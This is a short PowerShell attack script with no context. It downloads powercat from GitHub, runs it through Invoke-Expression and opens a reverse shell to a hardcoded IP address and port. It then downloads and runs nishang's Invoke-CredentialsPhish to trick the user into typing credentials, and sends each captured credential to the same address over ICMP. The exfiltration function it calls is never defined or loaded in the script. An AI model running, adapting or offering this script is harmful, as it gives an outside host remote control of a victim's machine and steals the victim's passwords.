$ip = "51.38.185.232"
$port = 413

start-job -ScriptBlock {
Param($ip,$port)
    iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex 
    powercat -c $ip -p $port -ep 
} -ArgumentList $ip, $port

iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
Invoke-CredentialsPhish | % { $p = $_; 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $p -Verbose } }

